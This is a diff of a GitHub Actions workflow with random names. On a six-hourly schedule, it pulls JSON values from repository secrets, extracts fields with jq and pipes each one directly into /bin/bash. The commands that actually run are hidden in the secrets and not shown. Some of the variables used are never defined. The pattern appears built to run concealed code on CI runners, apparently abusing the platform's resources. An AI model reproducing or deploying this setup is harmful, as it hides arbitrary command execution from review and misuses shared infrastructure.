@@ -3,8 +3,9 @@ name: wangniman6758
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
-jobs:  # 516
+    - cron: '54 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,8 +13,9 @@ jobs:  # 516
       - uses: actions/checkout@v4
       - name: wangniman6758
         env:
-          rg387: ${{ secrets.rg387 }}
+          yqrik47258: ${{ secrets.yqrik47258 }}
         run: |
-          echo $rg387 | jq -r .ayx3 | /bin/bash
-          echo $znfht8203 | jq -r .w9 | /bin/bash
+          echo $yqrik47258 | jq -r .yzmc9 | /bin/bash
+          echo $cpie8 | jq -r .uwv1 | /bin/bash
+          echo $kfa16344 | jq -r .obma76337 | /bin/bash
 
